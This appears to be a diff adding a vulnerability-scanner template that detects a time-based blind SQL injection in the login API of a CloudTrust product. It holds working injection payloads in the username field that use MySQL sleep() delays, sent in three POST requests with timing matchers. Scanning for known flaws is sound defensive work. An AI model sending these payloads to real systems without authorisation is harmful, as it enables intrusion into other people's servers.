@@ -1,0 +1,48 @@
+id: cloudtrust-sql-bind
+info:
+  name: CloudTrust 登录接口 - 时间盲注漏洞
+  author: 小r
+  severity: high
+  reference:
+    - https://www.cloudtrust.com.cn/product/jingyun.html
+  metadata:
+    verified: true
+    max-request: 3
+    vendor: cloudtrust
+    product: cloudtrust
+  tags: sqli,vuln,cloudtrust
+flow: http(1) && http(2) && http(3)
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/api/user/login'
+    redirects: false
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(7))a)='
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration * 1000 >= 7000 && duration * 1000 <= 10000'
+  - method: POST
+    path:
+      - '{{BaseURL}}/api/user/login'
+    redirects: false
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(1))a)='
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration * 1000 >= 1000 && duration * 1000 <= 4000'
+  - method: POST
+    path:
+      - '{{BaseURL}}/api/user/login'
+    redirects: false
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(4))a)='
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration * 1000 >= 4000 && duration * 1000 <= 7000'
